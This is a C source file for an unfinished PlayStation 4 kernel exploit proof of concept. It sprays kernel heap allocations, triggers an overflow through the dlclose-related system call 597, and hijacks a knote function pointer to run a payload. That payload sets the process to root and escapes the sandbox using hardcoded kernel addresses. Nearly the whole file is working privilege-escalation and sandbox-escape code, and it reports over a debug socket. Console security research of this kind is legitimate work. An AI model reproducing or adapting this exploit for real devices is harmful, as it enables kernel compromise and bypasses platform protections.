#include "ps4.h"
#include "define.h"

/*
Thanks To BigBoss And Twisted For The Hitns
This is PoC and the payload still needs some work
*/

volatile static int netsock;

// Perform kernel allocation aligned to 0x800 bytes
SceKernelEqueue kernelAllocation(int fd) {
	SceKernelEqueue kv;
	sceKernelCreateEqueue(&kv, "dlclose");

	sceKernelAddReadEvent(kv, fd, 0, NULL);

	printf("queue created = %p\n", kv);
	return kv;
}

void kernelFree(SceKernelEqueue allocation) {
	if (0 == 0){
		printf("Trigger sceKernelDeleteEqueue\n");
		sceKernelDeleteEqueue(allocation);
	} else {
		printf("Trigger close\n");
		close(allocation);
	}
}

char *criticalPayloadMessage = "  [+] Entered critical payload\n";
void payload(struct knote *kn) {
	struct thread *td;

	struct ucred *cred;
	
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	{
		int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10;

		struct sendto_args args = { netsock, criticalPayloadMessage, strlen(criticalPayloadMessage), 0, NULL, 0 };
		sendto(td, &args);

	}
	//while(1);
	//printf("  [+] Entered kernel payload!\n");
	
	// Privilege escalation
	// Escalate process to root
	// Resolve creds, needs fixing?
	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	{
		int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10;

		struct sendto_args args = { netsock, criticalPayloadMessage, strlen(criticalPayloadMessage), 0, NULL, 0 };
		sendto(td, &args);

	}
	// Jailbreak yet to figure this out
	// find symbol ofset, dump kernel, or maybe use failoverflow dynamic kernel symbol resolver
	//cred->cr_prison = &prison0;
	
	// Sandbox escape
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;
	
	{
		int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10;

		struct sendto_args args = { netsock, criticalPayloadMessage, strlen(criticalPayloadMessage), 0, NULL, 0 };
		sendto(td, &args);

	}
	
	// Enable UART output
	//uint16_t *bootParams = (uint16_t *)0xFFFFFFFF833242F6;
	//*bootParams &= ~(1 << 15);
	
	// Disable write protection
	//...

	// Patch kernel functions
	//...
	
	// Restore write protection
	//...
	
	// Install kexec system call
	//...
	
	// etc...

	//return to shell?
	//asm volatile("swapgs");
	//asm volatile("sysretq");

	{
		int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)0xFFFFFFFF8249EC10;

		struct sendto_args args = { netsock, criticalPayloadMessage, strlen(criticalPayloadMessage), 0, NULL, 0 };
		sendto(td, &args);

	}
}

void *exploitThread(void *arg) {
	// Perform oveflow - userland:
	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;

	uint64_t mappingSize = bufferSize + overflowSize;

	int64_t count = (0x100000000 + bufferSize) / 4;

	
	SceKernelEqueue allocation[100], m, m2;


	// Get fd to 3840
	static int sock = 0;

	//since dup2 is not allowed
	int fd = (bufferSize - 0x800) / 8;
	while(sock != fd) {
		sock = sceNetSocket("psudodup2", AF_INET, SOCK_STREAM, 0);
	}
	printf("fd = %d\n", (bufferSize - 0x800) / 8);	
	int i;
	for(i = 0; i < 100; i++) {
		allocation[i] = kernelAllocation(fd);
	}

	
	// Create hole for the system call's allocation
	printf("m kernelAllocation:\n");
	m = kernelAllocation(fd);
	printf("m2 kernelAllocation:\n");
	m2 = kernelAllocation(fd);
	kernelFree(m);

	// Map the buffer, spray the heap, etc
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	printf("mapping = %p\n", mapping);
	struct knote kn;
	struct filterops fo;
	
	printf("perform overflow?\n");
	struct knote **overflow =(struct knote **)(mapping + bufferSize);
	for(i = 0; i < overflowSize / sizeof(struct knote *); i++) {
			overflow[i] = &kn;
	}

	kn.kn_fop = &fo;

	fo.f_detach = payload;


	// Perform the overflow
	printf("Calling sys_dynlib_prepare_dlclose\n");
	syscall(597, 1, mapping, &count);

	// Execute the payload
	printf("moment of truth\n");
	kernelFree(m2);
	
	return NULL;
}

int _main(void) {
	ScePthread thread;
	
	// Resolve functions, connect to socket, etc
	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();


	// -- DEBUG SOCKET --
	struct sockaddr_in server;
	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 91);
	server.sin_port = sceNetHtons(9023);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	netsock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(netsock, (struct sockaddr *)&server, sizeof(server));
	int flag = 1;
	sceNetSetsockopt(netsock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	// -- DEBUG SOCKET --
	
	printf("[+] Starting...\n");
	printf("[+] UID = %d\n", getuid());
	
	// Create exploit thread
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		printf("[-] scePthreadCreate\n");
		sceNetSocketClose(netsock);
		return 1;
	}
	
	// Wait for thread to exit
	scePthreadJoin(thread, NULL);
	
	// At this point we should have root and jailbreak
	if(getuid() != 0) {
		printf("[-] Kernel patch failed!\n");
		sceNetSocketClose(netsock);
		return 1;
	}
	
	printf("[+] Kernel patch success!\n");
	
	// Dump files, patch memory from other processes, boot Linux, etc
	//...
	
	sceNetSocketClose(netsock);
	return 0;
}
